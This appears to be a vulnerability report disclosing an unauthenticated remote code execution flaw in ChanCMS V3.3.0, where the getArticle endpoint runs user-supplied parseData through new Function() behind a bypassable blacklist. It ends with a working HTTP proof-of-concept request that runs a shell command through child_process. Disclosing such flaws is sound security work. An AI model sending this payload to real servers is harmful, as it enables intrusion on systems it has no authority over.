# Vendor

yanyutao0402

# Product

ChanCMS

# version

 V3.3.0

# Download 

https://gitee.com/yanyutao0402/ChanCMS

# Vulnerability

RCE

# Description

Although the code tries to clean up parseData using `safeExecuteUserFunction`, this blacklisting method is usually unreliable.Blacklist filtering can be bypassed,users can execute any system command without logging in.

# Analysis

The `search` method in `app/modules/cms/controller/collect.js`，the `getArticle` method also has a potential remote code execution (RCE) vulnerability. It gets the parseData from the request body and then uses `new Function()` to execute it.
Although the code tries to clean up parseData using `safeExecuteUserFunction`, this blacklisting method is usually unreliable. An attacker may find ways to bypass filtering and thus execute arbitrary JavaScript code. Since this is executed on the server side, it is an RCE vulnerability.

<img width="710" height="278" alt="image" src="https://github.com/user-attachments/assets/78d43a54-3aba-4a5e-97f0-40eafe8e3ead" />

We reproduce this RCE vulnerability

<img width="927" height="340" alt="image" src="https://github.com/user-attachments/assets/0cce3e93-609a-412a-b1f6-59920b31cebd" />

Then we request the 666.txt written to see the execution result of the command:

<img width="390" height="153" alt="image" src="https://github.com/user-attachments/assets/8da33dc0-e934-4176-9617-1ed5ac90b66f" />

Of course, you can also directly play a calculator to verify:

<img width="1276" height="697" alt="image" src="https://github.com/user-attachments/assets/7b0f64e1-473a-4b32-a652-6838a93a1ccd" />


# POC
```
POST /cms/collect/getArticle HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Content-Length: 286

{
  "taskUrl": "http://localhost:3000/favicon.ico",
  "titleTag": "title",
  "articleTag": "body",
  "parseData": "return (async () => { const { execSync } = await import(/* webpackIgnore: true */ 'child_process'); return execSync('whoami>app/public/666.txt').toString(); })()"
}

```
